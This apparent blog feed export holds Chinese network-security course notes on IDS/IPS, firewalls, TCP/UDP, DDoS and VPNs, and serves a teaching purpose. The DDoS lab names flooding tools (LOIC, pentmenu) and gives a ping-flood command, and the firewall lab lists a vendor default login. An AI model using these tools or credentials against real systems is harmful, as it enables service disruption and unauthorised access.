title="四、IDS与IPS的部署"></a>四、IDS与IPS的部署</h3><p>IPS：因为可以阻断攻击阻断入侵，所以部署方式为串联模式</p><p><a href="https://imgchr.com/i/UBgCwR"><img src="https://s1.ax1x.com/2020/07/16/UBgCwR.png" alt="UBgCwR.png"></a></p><p>IDS：因为IDS不能阻断攻击，一般部署方式为旁路模式（并行），然后设置交换机某个端口的镜像到IDS的端口，就可以得到数据进行入侵检测了。</p><p><a href="https://imgchr.com/i/UBg0kq"><img src="https://s1.ax1x.com/2020/07/16/UBg0kq.png" alt="UBg0kq.png"></a></p><h3 id="五、IDS体系架构"><a href="#五、IDS体系架构" class="headerlink" title="五、IDS体系架构"></a>五、IDS体系架构</h3><p>1、控制中心：一般不是设备，是PC。</p><p>2、引擎：才是IDS设备本身，流量数据收集，入侵行为检测分析，分析结果交给控制中心。</p><p><a href="https://imgchr.com/i/UBWVpV"><img src="https://s1.ax1x.com/2020/07/16/UBWVpV.png" alt="UBWVpV.png"></a></p><p><a href="https://imgchr.com/i/UBfLxf"><img src="https://s1.ax1x.com/2020/07/16/UBfLxf.png" alt="UBfLxf.png"></a></p><h3 id="六、IPS体系架构"><a href="#六、IPS体系架构" class="headerlink" title="六、IPS体系架构"></a>六、IPS体系架构</h3><p>包含了引擎+控制中心，一般可以直接插入电话卡、音响、显示器。</p><h3 id="七、IPS的常用功能"><a href="#七、IPS的常用功能" class="headerlink" title="七、IPS的常用功能"></a>七、IPS的常用功能</h3><ul><li>入侵防御-弱口令</li><li>入侵防御-防暴力破解</li><li>入侵防御-SQL注入</li><li>入侵防御-XSS注入</li><li>入侵防御-防病毒</li><li>入侵防御-恶意样本检测</li><li>入侵防御-服务器自学习防护</li><li>上网行为管理</li><li>应用过滤-WEB过滤</li><li>应用过滤-邮件过滤</li><li>应用过滤-敏感信息防护</li><li>WEB恶意扫描防护</li><li>HA/链路聚合等</li></ul><h3 id="八、IDS与IPS的两个重要参数"><a href="#八、IDS与IPS的两个重要参数" class="headerlink" title="八、IDS与IPS的两个重要参数"></a>八、IDS与IPS的两个重要参数</h3><p><strong>误报</strong>：检测系统在检测时，将系统的正常行为判为入侵行为的错误，被称为误报。检测系统在检测过程中，出现误报的概率称为系统的误报率。</p><p><strong>漏报</strong>：检测系统在检测时，没有能够正确的识别某些入侵行为，因而没有报警现象称为漏报。检测系统在检测过程中出现漏报的概率称为系统漏报率。</p><h3 id="九、IPS的部署流程"><a href="#九、IPS的部署流程" class="headerlink" title="九、IPS的部署流程"></a>九、IPS的部署流程</h3><p><a href="https://imgchr.com/i/UB4BN9"><img src="https://s1.ax1x.com/2020/07/16/UB4BN9.png" alt="UB4BN9.png"></a></p><p>步骤参考各个厂家的手册！</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙原理及部署方式</title>
      <link href="/2020/07/14/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/28%E3%80%81%E9%98%B2%E7%81%AB%E5%A2%99%E5%8E%9F%E7%90%86%E5%8F%8A%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F/"/>
      <url>/2020/07/14/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/28%E3%80%81%E9%98%B2%E7%81%AB%E5%A2%99%E5%8E%9F%E7%90%86%E5%8F%8A%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="防火墙原理及部署方式"><a href="#防火墙原理及部署方式" class="headerlink" title="防火墙原理及部署方式"></a>防火墙原理及部署方式</h2><h3 id="一、防火墙的概述"><a href="#一、防火墙的概述" class="headerlink" title="一、防火墙的概述"></a>一、防火墙的概述</h3><h4 id="1、防火墙定义"><a href="#1、防火墙定义" class="headerlink" title="1、防火墙定义"></a>1、防火墙定义</h4><p>防火墙是一款具备防护功能的网络设备。</p><h4 id="2、防火墙的防护作用"><a href="#2、防火墙的防护作用" class="headerlink" title="2、防火墙的防护作用"></a>2、防火墙的防护作用</h4><p>作用：网络隔离/隔离区域</p><p>隔离网络：将需要保护的网络与不可信任的网络隔离。对内部信息进行安全防护。</p><p><a href="https://imgchr.com/i/Ut2nZ8"><img src="https://s1.ax1x.com/2020/07/14/Ut2nZ8.png" alt="Ut2nZ8.png"></a></p><h4 id="3、防火墙的基本功能"><a href="#3、防火墙的基本功能" class="headerlink" title="3、防火墙的基本功能"></a>3、防火墙的基本功能</h4><p>1）网络隔离</p><p>2）攻击防护（DOS攻击）</p><p>3）日志记录</p><p>4）路由器、交换机的功能</p><p>5）冗余设计（可支持备用防火墙）</p><p>6）访问控制列表ACL</p><p>7）VPN功能、NAT功能（源转换==PAT、目标转换==端口映射）（路由器的活它都有）</p><h4 id="4、常见的防火墙产品"><a href="#4、常见的防火墙产品" class="headerlink" title="4、常见的防火墙产品"></a>4、常见的防火墙产品</h4><blockquote><p>华为、思科、锐捷、天融信、启明星辰、奇安信、深信服（上网行为做的棒）。</p></blockquote><p>思科：防火墙编号为ASA 55XX</p><p><a href="https://imgchr.com/i/UtRUXt"><img src="https://s1.ax1x.com/2020/07/14/UtRUXt.png" alt="UtRUXt.png"></a></p><p>天融信：NGFW4000</p><p><a href="https://imgchr.com/i/UtRDAS"><img src="https://s1.ax1x.com/2020/07/14/UtRDAS.png" alt="UtRDAS.png"></a></p><h3 id="二、防火墙的区域隔离"><a href="#二、防火墙的区域隔离" class="headerlink" title="二、防火墙的区域隔离"></a>二、防火墙的区域隔离</h3><h4 id="1、防火墙的区域概念"><a href="#1、防火墙的区域概念" class="headerlink" title="1、防火墙的区域概念"></a>1、防火墙的区域概念</h4><p>一般防火墙将网络分为3个区域：</p><p>1）内部区域 / 信任区域：Trust / Inside</p><p>2）DMZ区域 / 隔离区：也称为停火区。</p><p>3）外部区域 / 非信任区域：Untrust / Outside</p><p><a href="https://imgchr.com/i/UtWW2d"><img src="https://s1.ax1x.com/2020/07/14/UtWW2d.png" alt="UtWW2d.png"></a></p><h4 id="2、区域间通信"><a href="#2、区域间通信" class="headerlink" title="2、区域间通信"></a>2、区域间通信</h4><p>默认情况下，区域间通信是完全被屏蔽的，<strong>区域间需要写<u>策略</u>才能放行数据</strong>，而且要设置放行方向。</p><h4 id="3、如何写策略"><a href="#3、如何写策略" class="headerlink" title="3、如何写策略"></a>3、如何写策略</h4><p>经常会使用到的策略：</p><p>1、Inside – to – Outside：全部放行。</p><p>2、Inside – to – DMZ：全部放行。</p><p>3、DMZ – to –Outside：全部放行。</p><blockquote><p>防火墙是智能的，防火墙会判断通过防火墙的数据是主动访问还是回包，如果是主动访问就要查看策略是否允许，如果是回包会智能通过。</p></blockquote><h4 id="4、为什么设置DMZ区域"><a href="#4、为什么设置DMZ区域" class="headerlink" title="4、为什么设置DMZ区域"></a>4、为什么设置DMZ区域</h4><p>当公司有需要对外发布服务器的时候，将服务器放置到DMZ区域、并写放行策略：outside – to – DMZ，一旦DMZ区域被敌人攻破，由于DMZ区域为隔离区域，不会进一步殃及破坏inside区域，所以设置DMZ区域是在公司需要对外发布服务器的同时保护了Inside内部区域。</p><h3 id="三、防火墙的历史发展和分类"><a href="#三、防火墙的历史发展和分类" class="headerlink" title="三、防火墙的历史发展和分类"></a>三、防火墙的历史发展和分类</h3><h4 id="1、包过滤防火墙（早期的防火墙）"><a href="#1、包过滤防火墙（早期的防火墙）" class="headerlink" title="1、包过滤防火墙（早期的防火墙）"></a>1、包过滤防火墙（早期的防火墙）</h4><p>包过滤防火墙：只能基于IP与端口号对数据进行过滤、不能对应用层数据做过滤，因此<strong>也称其为网络层防火墙</strong>。而且不够智能，外网回来的包，不能识别是回包还是主动发的包。</p><h4 id="2、代理防火墙（早期的防火墙）"><a href="#2、代理防火墙（早期的防火墙）" class="headerlink" title="2、代理防火墙（早期的防火墙）"></a>2、代理防火墙（早期的防火墙）</h4><p>特点：可以基于应用层对数据过滤，所谓代理很麻烦，大大降低网络通信效率。</p><h4 id="3、状态检测防火墙（目前主流防火墙）"><a href="#3、状态检测防火墙（目前主流防火墙）" class="headerlink" title="3、状态检测防火墙（目前主流防火墙）"></a>3、状态检测防火墙（目前主流防火墙）</h4><p>特点：主流防火墙，智能检测回包机制。每通过一个防火墙的策略，就生成一个状态记录，再有相同的策略经过时，直接看状态记录吻不吻合，吻合直接按照状态记录走，就不看路由表、策略表、NAT表、ARP缓存等了；智能检测回包同理，也是查看状态记录表是否与此数据包相匹配的记录，判断是否为回包，如果是，直接按照状态记录送进去。（早期状态检测防火墙依然不能检测应用层数据）</p><p><a href="https://imgchr.com/i/UtH6aR"><img src="https://s1.ax1x.com/2020/07/14/UtH6aR.png" alt="UtH6aR.png"></a></p><p><u>状态检测防火墙数据处理流程图：</u></p><p><a href="https://imgchr.com/i/UtOESP"><img src="https://s1.ax1x.com/2020/07/14/UtOESP.png" alt="UtOESP.png"></a></p><h4 id="4、高级应用防火墙（DPI防火墙）（目前主流防火墙）"><a href="#4、高级应用防火墙（DPI防火墙）（目前主流防火墙）" class="headerlink" title="4、高级应用防火墙（DPI防火墙）（目前主流防火墙）"></a>4、高级应用防火墙（DPI防火墙）（目前主流防火墙）</h4><p>高级应用防火墙 == Deep Packet Inspection，DPI防火墙</p><p>在<strong>3、状态检测防火墙</strong>的基础上，增加了应用层数据检测模块，可以检测应用层数据！</p><p><u>未来的发展方向，目前的DPI防火墙还不高效。</u></p><h3 id="四、防火墙的工作模式与部署方式和位置"><a href="#四、防火墙的工作模式与部署方式和位置" class="headerlink" title="四、防火墙的工作模式与部署方式和位置"></a>四、防火墙的工作模式与部署方式和位置</h3><h4 id="1、路由模式"><a href="#1、路由模式" class="headerlink" title="1、路由模式"></a>1、路由模式</h4><p>路由模式的防火墙端口一般设置为三层端口，防火墙工作在三层路由器模式，路由模式防火墙可以改变网络结构（因为它的端口是三层端口）。</p><p>一般路由模式的防火墙部署在公司外网总出口。</p><p><a href="https://imgchr.com/i/UNDaSP"><img src="https://s1.ax1x.com/2020/07/14/UNDaSP.png" alt="UNDaSP.png"></a></p><h4 id="2、透明模式（防火墙二层端口）"><a href="#2、透明模式（防火墙二层端口）" class="headerlink" title="2、透明模式（防火墙二层端口）"></a>2、透明模式（防火墙二层端口）</h4><p>透明模式防火墙的端口设置为二层端口，防火墙工作在二层模式。透明模式不会改变网络拓扑结构。</p><p>一般透明模式的防火墙部署在公司内网的链路上，来保护整个内部，或者局部的设备。</p><p><a href="https://imgchr.com/i/UNyoTg"><img src="https://s1.ax1x.com/2020/07/14/UNyoTg.png" alt="UNyoTg.png"></a></p><h4 id="3、混杂模式"><a href="#3、混杂模式" class="headerlink" title="3、混杂模式"></a>3、混杂模式</h4><p><a href="https://imgchr.com/i/UNqblV"><img src="https://s1.ax1x.com/2020/07/14/UNqblV.png" alt="UNqblV.png"></a></p><h3 id="五、防火墙的基本部署流程"><a href="#五、防火墙的基本部署流程" class="headerlink" title="五、防火墙的基本部署流程"></a>五、防火墙的基本部署流程</h3><h4 id="实验1、入门天融信安全网关TopGate系统实验"><a href="#实验1、入门天融信安全网关TopGate系统实验" class="headerlink" title="实验1、入门天融信安全网关TopGate系统实验"></a>实验1、入门天融信安全网关TopGate系统实验</h4><blockquote><p>实验环境：TopGate2操作系统</p><p><strong>账号密码：superman talent</strong></p></blockquote><p>安全网关具有WEB配置界面：<a href="https://192.168.1.254:8080/">https://192.168.1.254:8080</a></p><p>防火墙的全系产品一般厂家出厂默认给eth0端口配置好192.168.1.254/24的IP了，同时防火墙操作系统默认开启了443https端口，并将WEB伪装为8080端口发布。工程师想使用WEB配置防火墙只需要将PC插入eth0端口，然后配置PC的IP与安全网关在同一网段，访问WEB配置的页面即可进行WEB配置。</p><p><a href="https://imgchr.com/i/UN3T29"><img src="https://s1.ax1x.com/2020/07/14/UN3T29.png" alt="UN3T29.png"></a></p><h4 id="实验2、部署防火墙实现区域隔离"><a href="#实验2、部署防火墙实现区域隔离" class="headerlink" title="实验2、部署防火墙实现区域隔离"></a>实验2、部署防火墙实现区域隔离</h4><blockquote><p>此实验eth0接口上用两个机器是因为天融信的安全网关TopGate要使用高版本浏览器，XP不行，老师顺势讲了真实机开启虚拟网卡和虚拟机连接到同一个网络的操作（真实机不能两块网卡都配网关[有待考证]），我使用的是VirtualBox无虚拟网卡，因此eth0直接使用Win7相连。</p><p>实验环境：VirtualBOX虚拟机，Win7(internet01)、Win2003两台(internet02-3)、TopGate防火墙一台且开启三块网卡(eth0-internet01、eth1-internet02、eth2-internet03)。</p></blockquote><p><a href="https://imgchr.com/i/UUeesS"><img src="https://s1.ax1x.com/2020/07/14/UUeesS.png" alt="UUeesS.png"></a></p><p>1、准备好实验环境后，Win7首先配置好IP、网关，直接连接防火墙的Web配置网页 <a href="https://192.168.1.254:8080/">https://192.168.1.254:8080</a> 进行防火墙配置。</p><p>2、创建区域，并将端口加入响应区域：资源管理 -》 区域 -》 编辑默认的区域 -》改个名inside，访问权限改成禁止（表示默认禁止访问，需要走策略），成员就是eth0不用改 -》依次添加两个区域DMZ、outside，绑定网卡属性分别为是eth1、eth2。</p><p><a href="https://imgchr.com/i/UU6Hw8"><img src="https://s1.ax1x.com/2020/07/14/UU6Hw8.png" alt="UU6Hw8.png"></a></p><p>3、配置防火墙端口的IP地址：网络管理 -》 接口 -》 编辑接口 -》 配置路由端口 -》添加、确定 。</p><p>4、正常来说应该写路由了，但本实验所有直连网络已足够。</p><p>5、编写策略（in-out、dmz-out、in-dmz放行）：防火墙 -》 访问控制 -》添加策略 -》 选择区域，端口任意</p><p>6、尝试区域间的通信，验证策略是否成功部署。</p><h4 id="实验3、在实验2基础上配置源转换SNAT-PAT"><a href="#实验3、在实验2基础上配置源转换SNAT-PAT" class="headerlink" title="实验3、在实验2基础上配置源转换SNAT(PAT)"></a>实验3、在实验2基础上配置源转换SNAT(PAT)</h4><p><a href="https://imgchr.com/i/UaGy7t"><img src="https://s1.ax1x.com/2020/07/14/UaGy7t.png" alt="UaGy7t.png"></a></p><p>防火墙 -》 地址转换 -》 添加转换 -》 源转换、其他-选择区域</p><h4 id="实验4、在实验3基础上DMI区域部署http服务器（配置DNAT）"><a href="#实验4、在实验3基础上DMI区域部署http服务器（配置DNAT）" class="headerlink" title="实验4、在实验3基础上DMI区域部署http服务器（配置DNAT）"></a>实验4、在实验3基础上DMI区域部署http服务器（配置DNAT）</h4><p><a href="https://imgchr.com/i/UaJsv4"><img src="https://s1.ax1x.com/2020/07/14/UaJsv4.png" alt="UaJsv4.png"></a></p><p>资源管理 -》 地址  -》 添加主机 ，给防火墙 -》 地址转换中的目标转换的目标IP使用（无法输入IP，只能选择地址）。</p><h4 id="实验5、在实验4基础上"><a href="#实验5、在实验4基础上" class="headerlink" title="实验5、在实验4基础上"></a>实验5、在实验4基础上</h4><p><a href="https://imgchr.com/i/UdiY40"><img src="https://s1.ax1x.com/2020/07/15/UdiY40.png" alt="UdiY40.png"></a></p><p>1、创建内容安全策略：内容过滤 -》 HTTP过滤 -》 URL过滤 -》设置名字 -》 编辑即可； 内容过滤 -》 设置名字 -》 编辑即可；</p><p>2、设置内容安全策略：防火墙 -》 访问控制 -》 编辑策略 -》内容安全策略 -》 </p><h3 id="六、防火墙的HA"><a href="#六、防火墙的HA" class="headerlink" title="六、防火墙的HA"></a>六、防火墙的HA</h3><p><strong>High Available，HA</strong>：高可用性，对设备进行备份操作，并能在第一台出现故障，备份马上就能启用。</p><p>1、配置两个防火墙间心跳线的端口IP时，选择不同步此地址。</p><p>2、两个防火墙都设置：高可用性 -》 高可用性 -》设置心跳地址、热备组、监听接口设置eth0、eth2 -》 启用</p><p><a href="https://imgchr.com/i/UBBxQs"><img src="https://s1.ax1x.com/2020/07/16/UBBxQs.png" alt="UBBxQs.png"></a></p><h3 id="七、服务器群集（负载均衡）"><a href="#七、服务器群集（负载均衡）" class="headerlink" title="七、服务器群集（负载均衡）"></a>七、服务器群集（负载均衡）</h3><p><strong>服务器群集</strong>：提高可靠性，不间断为用户提供web服务，而用户也只需要记住一个IP或域名即可！</p><p><a href="https://imgchr.com/i/UBVDRs"><img src="https://s1.ax1x.com/2020/07/16/UBVDRs.png" alt="UBVDRs.png"></a></p><p>1、资源管理给两个服务器设置地址</p><p>2、高可用性 -》 服务器负载均衡 -》添加服务器 -》 然后将两个服务器添加均衡组，参数设置轮流时间</p><h3 id="九、作业"><a href="#九、作业" class="headerlink" title="九、作业"></a>九、作业</h3><p><strong>对TCP报文抓包分析</strong></p><p>要求：客户机telnet服务器，并抓包整个过程，且截图TCP三次握手整个过程、4次断开整个过程！并截图关键点，如SYN=1  FIN=1等</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP与UDP协议</title>
      <link href="/2020/07/13/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/27%E3%80%81TCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/07/13/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/27%E3%80%81TCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP与UDP协议"><a href="#TCP与UDP协议" class="headerlink" title="TCP与UDP协议"></a>TCP与UDP协议</h2><h3 id="一、TCP与UDP协议分析"><a href="#一、TCP与UDP协议分析" class="headerlink" title="一、TCP与UDP协议分析"></a>一、TCP与UDP协议分析</h3><p><u><strong>1、</strong>TCP与UDP协议概述</u></p><p>TCP与UDP协议属于ISO第四层传输层协议。</p><p>传输层包括两大协议：TCP和UDP。</p><p><u><strong>2、</strong>TCP和UDP协议的区别</u></p><p>TCP协议：面向连接服务，可靠传输数据、速度慢</p><p>UDP协议：无连接服务，UDP不可靠、速度快</p><p><u><strong>3、</strong>TCP与UDP协议的共同作用</u>：通过源与目标端口号，来完成进程到进程的通信。</p><h3 id="二、TCP头部分析"><a href="#二、TCP头部分析" class="headerlink" title="二、TCP头部分析"></a>二、TCP头部分析</h3><p><a href="https://imgchr.com/i/UJ1D81"><img src="https://s1.ax1x.com/2020/07/13/UJ1D81.png" alt="UJ1D81.png"></a></p><blockquote><p><strong>源端口号：</strong>一般客户机的源端口号都是随机的，且一般都是50000以上！</p><p><strong>目标端口号：</strong>一般服务器上的目标端口号都是固定的，如80、443、23、53。</p><p><strong>端口号范围：</strong>0-65535 0与65535有特殊用途，一般1-65534可用（1-1024区间基本被国际标准组织ISO占用分配给了固定的服务器）。</p><p><strong>序号：</strong>seq随机生成的数据包的编号。</p><p><strong>确认号：</strong>ack确认已完整收到TCP数据包，会回复一个包，确认号为序号+1。如果回复确认号还是为序列号，说明收到的数据包不完整。</p><p><strong>首部长度：</strong>20-60字节。</p><p><strong>保留</strong>：保留待开发。</p><p><strong>六位控制位：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">URG: urgen，紧急位。 1，有紧急数据，需要根据紧急指针将包中紧急数据优先推送。 0，无紧急数据。</span><br><span class="line">ACK: 确认控制位。 1，确认号有效。 0，确认号无效。</span><br><span class="line">PSH: push，推送位。 1，上层有数据。 0，上层无数据。</span><br><span class="line">RST: Reset，重置位。 1，请求非正常断开，强制断开。</span><br><span class="line">SYN: 建立连接位。 1,请求和同意建立连接。只有初始状态建立连接时前两个报文为1。</span><br><span class="line">FIN: 断开连接位。 1,请求断开连接。</span><br></pre></td></tr></table></figure><p><strong>窗口大小</strong>：用来做流量控制，限制最大一次可接受的数据量。类似水龙头。</p><p><strong>校验和</strong>：校验整个数据段（五层数据+四层数据）。</p><p><strong>紧急指针：</strong>有紧急数据（紧急位URG为1），需要根据紧急指针将包中紧急数据优先推送。</p></blockquote><h3 id="三、UDP协议分析"><a href="#三、UDP协议分析" class="headerlink" title="三、UDP协议分析"></a>三、UDP协议分析</h3><p><a href="https://imgchr.com/i/UJUsBt"><img src="https://s1.ax1x.com/2020/07/13/UJUsBt.png" alt="UJUsBt.png"></a></p><p>UDP包头长度：8字节。</p><p>UDP长度字段：代表5+4层数据的总长度。</p><p>UDP校验和：校验整个数据段（五层数据+四层数据）。UDP唯一的可靠机制。</p><h3 id="四、TCP三次握手连接"><a href="#四、TCP三次握手连接" class="headerlink" title="四、TCP三次握手连接"></a>四、TCP三次握手连接</h3><p><a href="https://imgchr.com/i/UJDvvD"><img src="https://s1.ax1x.com/2020/07/13/UJDvvD.png" alt="UJDvvD.png"></a></p><p>重点：SYN只有双方前2次握手为1，代表彼此要建立连接。</p><blockquote><p>面试题：为什么TCP可靠？</p><p>答：因为TCP是面向连接服务，同时双方发送的每一个报文都有编号机制与确认重传机制，所以可以保证数据传输的可靠性。同时每个TCP协议的报文发送后，都会开启一个重传计时器，以便数据防止中途丢失而可以重传。</p></blockquote><h3 id="五、TCP四次握手断开连接"><a href="#五、TCP四次握手断开连接" class="headerlink" title="五、TCP四次握手断开连接"></a>五、TCP四次握手断开连接</h3><p><a href="https://imgchr.com/i/UYU0Mj"><img src="https://s1.ax1x.com/2020/07/13/UYU0Mj.png" alt="UYU0Mj.png"></a></p><h3 id="六、抓包分析"><a href="#六、抓包分析" class="headerlink" title="六、抓包分析"></a>六、抓包分析</h3><p>使用Win7下的科来软件抓telnet报文，分析三次握手连接，四次握手断开连接。</p><h3 id="七、DDOS攻击"><a href="#七、DDOS攻击" class="headerlink" title="七、DDOS攻击"></a>七、DDOS攻击</h3><p><u><strong>1、</strong>Denial of Service, DOS拒绝服务攻击。</u>Hacker使用异常手段占满服务资源（带宽、内存、TCP会话、CPU等等），使服务器无法为正常用户提供服务。</p><p>缺点是需要占用攻击者的资源，杀敌一千、自损八百。</p><p><a href="https://imgchr.com/i/UYDTwd"><img src="https://s1.ax1x.com/2020/07/13/UYDTwd.png" alt="UYDTwd.png"></a></p><p><u><strong>2、</strong>Distributed Denial of Service, DDOS分布式拒绝服务攻击</u></p><p>例如：</p><ol><li><p>ICMP Flooding泛洪攻击，上千人同时ping -t l 65500，占满网卡的资源。</p></li><li><p>UDP Flooding泛洪攻击，实现流量攻击/实现cpu内存等资源攻击。</p></li><li><p>TCP SYN Flooding泛洪攻击，占用会话资源，也称为TCP半连接攻击。</p></li></ol><p>​    攻击主要目标是WEB服务器。一般由防火墙做防护，原理就是防火墙收到TCP建立会话的报文后由防火墙返回一个SYN、ACK，如果对方没有回应，就认为这是一个半连接攻击，会进行处理。所以由防火墙过滤掉了这种攻击，不会占用服务器会话端口资源。</p><p>​    但防火墙也会被DDOS击垮。可以寻求运营商帮助抵挡DDOS攻击，在连接到公司外网入口的路由器端口进行抵挡，称为“流量清洗”。</p><p>4）Challenge Collapsar，CC攻击，攻击目标主要也是WEB服务器，属于TCP SYN攻击的升级版本，完成三次握手过程，非半连接。</p><p>5）Smurf flooding：攻击目标是路由器/交换机，防御方法路由器、交换机上的Smurf服务关闭。</p><blockquote><p>泛洪：Flooding</p></blockquote><p><a href="https://imgchr.com/i/UY20hj"><img src="https://s1.ax1x.com/2020/07/13/UY20hj.png" alt="UY20hj.png"></a></p><h3 id="八、DDOS攻击实验"><a href="#八、DDOS攻击实验" class="headerlink" title="八、DDOS攻击实验"></a>八、DDOS攻击实验</h3><blockquote><p><strong>本实验必须在虚拟环境中练习！除非有渗透授权，客户要求做压力测试。</strong></p></blockquote><p>实验一、</p><blockquote><p>实验环境：WIN7, dotNetFx40环境(.net framework)，或者WIN10。</p><p>实验软件：WIN7需要安装dotNetFx40搭建环境，然后使用LOIC-1.0.8软件。</p></blockquote><p>LOIC软件支持TCP SYN FLooding、UDP Flooding、CC 攻击。</p><p><a href="https://imgchr.com/i/UYOzGt"><img src="https://s1.ax1x.com/2020/07/13/UYOzGt.png" alt="UYOzGt.png"></a></p><p>实验二、</p><blockquote><p>实验环境：Kali</p><p>实验软件：pentmenu，DOS攻击的Bash脚本，可在github上下载。</p><p><a href="https://github.com/GinjaChris/pentmenu">https://github.com/GinjaChris/pentmenu</a></p></blockquote><p><a href="https://imgchr.com/i/UtEHQe"><img src="https://s1.ax1x.com/2020/07/13/UtEHQe.png" alt="UtEHQe.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPN</title>
      <link href="/2020/07/12/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/26%E3%80%81VPN/"/>
      <url>/2020/07/12/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/26%E3%80%81VPN/</url>
      
        <content type="html"><![CDATA[<h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><h3 id="一、VPN概述"><a href="#一、VPN概述" class="headerlink" title="一、VPN概述"></a>一、VPN概述</h3><h4 id="1、VPN定义"><a href="#1、VPN定义" class="headerlink" title="1、VPN定义"></a><strong>1、VPN定义</strong></h4><p>Virtual Private Network === 虚拟专用网络/虚拟专网</p><h4 id="2、VPN的优点"><a href="#2、VPN的优点" class="headerlink" title="2、VPN的优点"></a>2、VPN的优点</h4><p><strong>专线PN（Private Network）</strong>：不在互联网上，专线两端的通信数据由运营商单独建立的专线网络传输。安全、稳定、高效、低延时，价格高！</p><p><a href="https://imgchr.com/i/U1vqSO"><img src="https://s1.ax1x.com/2020/07/12/U1vqSO.png" alt="U1vqSO.png"></a></p><p><strong>VPN</strong>：在互联网中传输数据，通信两端使用PKI设施保证通信的机密性、完整性、可用性（身份验证）。VPN是一种技术，可以实现两家公司之间在不安全的网络上安全的传递信息，它解决了专线PN价格高的问题。</p><h4 id="3、目前互联网的现状"><a href="#3、目前互联网的现状" class="headerlink" title="3、目前互联网的现状"></a>3、目前互联网的现状</h4><p>互联网存在各种风险：数据泄露、数据被篡改、数据伪造伪装。</p><p>VPN可以通过在两个公司之间建立VPN隧道，建立“保护”两个网络实体之间的通信。</p><h4 id="4、VPN怎么做到安全通信"><a href="#4、VPN怎么做到安全通信" class="headerlink" title="4、VPN怎么做到安全通信"></a>4、VPN怎么做到安全通信</h4><p>1）使用加密技术防止数据被窃听（机密性）</p><p>2）数据完整性验证防止数据被破坏、篡改（完整性）</p><p>3）通过身份认证机制确认身份，防止被伪造、伪装。（身份验证/可用性）</p><h3 id="二、VPN的工作模式"><a href="#二、VPN的工作模式" class="headerlink" title="二、VPN的工作模式"></a>二、VPN的工作模式</h3><h4 id="1、传统模式"><a href="#1、传统模式" class="headerlink" title="1、传统模式"></a>1、传统模式</h4><h4 id="2、隧道模式（默认的模式）"><a href="#2、隧道模式（默认的模式）" class="headerlink" title="2、隧道模式（默认的模式）"></a>2、隧道模式（默认的模式）</h4><p>路由器外网端口上的VPN将整个私有IP包进行全部加密，并重新封装新的公网IP包头。</p><p>（VPN = 加密技术 + 重新封装技术）</p><p><a href="https://imgchr.com/i/U1vXOH"><img src="https://s1.ax1x.com/2020/07/12/U1vXOH.png" alt="U1vXOH.png"></a></p><h3 id="三、VPN的类型"><a href="#三、VPN的类型" class="headerlink" title="三、VPN的类型"></a>三、VPN的类型</h3><h4 id="1、远程访问VPN"><a href="#1、远程访问VPN" class="headerlink" title="1、远程访问VPN"></a>1、远程访问VPN</h4><p><strong>适用场景：</strong>出差员工或者在家办公人员 与 公司建立VPN隧道</p><p><strong>远程访问VPN技术：</strong> **SSL VPN(主流)**、PPTP VPN(翻墙)、L2TP VPN(翻墙)、SSTP VPN等等</p><p><a href="https://imgchr.com/i/U3SCQS"><img src="https://s1.ax1x.com/2020/07/12/U3SCQS.png" alt="U3SCQS.png"></a></p><p><strong>翻墙的原理（远程访问VPN的类型技术）：</strong></p><p>1）通过选定VPN协议的客户端软件向国外的VPN服务器拨号连接，访问国外的网站由国外的服务器提供服务。</p><p>2）在1的前提上在国内架设一台服务器作为代理服务器，替我们请求这个拨号过程，我们只需要在需要翻墙的软件上（例如浏览器）设置网络代理即可，这个软件就会将需要访问网络的操作请求发送到国内代理服务器上，由代理服务器进行数据访问请求以及发送给我们相关的响应。</p><blockquote><p>国家向运营商施压，一般公司的外网出口都设置相关的限制比如ACL，禁止使用一些VPN协议的拨号服务。但家庭仍然可用。</p></blockquote><p><a href="https://imgchr.com/i/U39dVH"><img src="https://s1.ax1x.com/2020/07/12/U39dVH.png" alt="U39dVH.png"></a></p><h4 id="2、点到点VPN"><a href="#2、点到点VPN" class="headerlink" title="2、点到点VPN"></a>2、点到点VPN</h4><p>使用场景：公司与公司之间建立VPN隧道</p><p>点到点VPN的技术：**IPsecVPN安全协议框架(99.9%)**、GRE VPN(运营商)、MPLS VPN(运营商)等等。</p><p><a href="https://imgchr.com/i/U3SkZj"><img src="https://s1.ax1x.com/2020/07/12/U3SkZj.png" alt="U3SkZj.png"></a> </p><h3 id="四、VPN加密技术"><a href="#四、VPN加密技术" class="headerlink" title="四、VPN加密技术"></a>四、VPN加密技术</h3><p>1、对称加密算法（见前章节）</p><p>2、非对称加密算法（见前章节）</p><p>3、哈希/摘要算法（见前章节）</p><h3 